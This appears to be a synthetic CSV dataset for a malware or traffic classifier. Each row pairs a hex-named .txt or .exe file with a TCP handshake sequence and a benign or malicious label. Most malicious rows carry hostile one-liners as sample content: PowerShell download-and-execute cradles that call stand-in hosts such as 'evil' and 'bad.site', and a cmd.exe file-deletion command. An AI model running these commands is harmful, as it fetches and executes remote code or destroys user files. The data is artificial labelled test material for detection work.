trace_id,sequence,valid,description,category,content
e210bb0a557d8e99.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,User guide: usage instructions and notes.
2b71395dee6626a9.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
c294783fe38ed829.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
9e9b20ed84f2bdd7.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
2d37687cb5a125e1.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
b6e63246afe40e8e.txt,SYN|SYN-ACK|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Changelog: fixed bugs and improved docs.
e0ce0e51ae38443b.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
0448d20fad584eec.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
3ddce67cdc8e7805.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
d432410ab58cd658.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
ad4ce3158a035761.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
2d09e4dadeef9710.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
c0ddd5fce9c80b21.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
981780fd7b9276ef.txt,SYN|SYN-ACK|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,"Lorem ipsum dolor sit amet, consectetur adipiscing elit."
a0af2c0d46bfa10f.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Configuration: key=value pairs; no executable content.
f44f5ab3498c21b0.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
922fc59597bf515d.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
7518b637c51e1499.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
8e9dd45d81352c2f.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
6cbeb1e7555db4f2.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
e025d612200e1660.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
7f38afe77b30def7.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
69eb03823bc34a82.txt,SYN|SYN-ACK|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Changelog: fixed bugs and improved docs.
117bc7c690dc2d08.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
fa260adf07767f78.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Configuration: key=value pairs; no executable content.
41133d83f7092db6.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
385c5e74c61aed5f.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
b1582d365b49c62d.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
4a289795d29da995.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Configuration: key=value pairs; no executable content.
b57cd867f900cacb.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Changelog: fixed bugs and improved docs.
f1fb0938250dcba5.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
22939d7c993e8a8f.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
973a353b886a9de6.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
23a38c0b002b4f9d.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
c3131f7d71ca2e9e.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
8895f58da2c5db75.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
5ac23e06b1c71fb4.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
093210672aadf17e.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
42b2a9e2c24030cc.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
fd3be79c2a3b85fe.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
6a6ddc2e37f92cdf.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
507e235629310284.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,User guide: usage instructions and notes.
11785978b20f0454.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
2e14d5c5270f63dd.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
5d5ca1bbd7594cf2.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
6d94cbf9a8341baa.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
5fefd7066e7cb634.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Readme: This is a harmless text file.
0f789797a3e31d56.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
07cf332bd99c4f86.txt,SYN|SYN-ACK|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,User guide: usage instructions and notes.
031f7fed1bac11ee.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
01071df7e2acaa6e.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
bdd5bb7c78f9f40c.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
a1290e4f7bedc8c7.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
5d6fb0ead834171b.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
6216fe566dccec8b.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Changelog: fixed bugs and improved docs.
60aaa4cc106832c0.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
d1b3563a5e9faf80.txt,SYN|SYN-ACK|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Readme: This is a harmless text file.
2ef959ab2d7529f6.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
2a1c7574a5c42eb8.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
f8b032d7ab7f225e.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
79072ee92448d21a.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Readme: This is a harmless text file.
0d148c6d99c3f7d8.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
c7ffb571cf9c59e6.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
335976765c234b90.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
6dba2e48aacc9b29.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
4bbd4db544dc9fc6.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
0ed72a28ba5bac7f.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
a7c1db2647c7032d.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
267d087a20e518fa.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
eac27fe60b2e3164.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
d4714868228ba284.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
ab139c5154c2c256.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
e51b0e8b3c1d3bc0.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Readme: This is a harmless text file.
1f2868b320098b56.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
878eb5423f917863.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
3c79800b46bcffb2.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
108c2c7c6598b9ff.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Readme: This is a harmless text file.
628cecc9ddc7b7df.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
6f8bdd35dc3acc80.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
bcfe5433b3a526d9.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
98bb99c8e2c267a0.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
f9f55be3b35ed9f0.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
852cd6ffd42a3752.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
b3644b6fe6822e8b.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
d1f3b50966a8bcd0.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
6665daec58e0cc78.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Changelog: fixed bugs and improved docs.
c9ec3caaf26a731e.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
b9d3f7a4f13fea67.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
89c34528e8607f85.txt,SYN|SYN-ACK|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,"Lorem ipsum dolor sit amet, consectetur adipiscing elit."
3aeb854be075e3c1.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,"Lorem ipsum dolor sit amet, consectetur adipiscing elit."
3c86ec9af68ccd08.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Changelog: fixed bugs and improved docs.
146b324c16ef0184.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
1b3feab547c227fc.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,User guide: usage instructions and notes.
2cd5f77043ea938c.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
0bd340493fe9842c.txt,SYN|SYN-ACK|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Readme: This is a harmless text file.
b6c75a63ffd51e0c.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
e22a77db2308908a.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
93d9763499bb1560.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
c64cb45906846a07.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
3d8b868359f623a9.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
7472085b66ce2fa4.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
dff8a6d0ce43f31e.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
dea2a83e79ec2df9.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
de88982d2dd49d4f.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
1eb825452f8266fb.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
08a5f122414c5d60.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
901634db7b0d7ed5.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
b0d6c5ce138c7e5d.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
d012e41f5d0ae356.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Changelog: fixed bugs and improved docs.
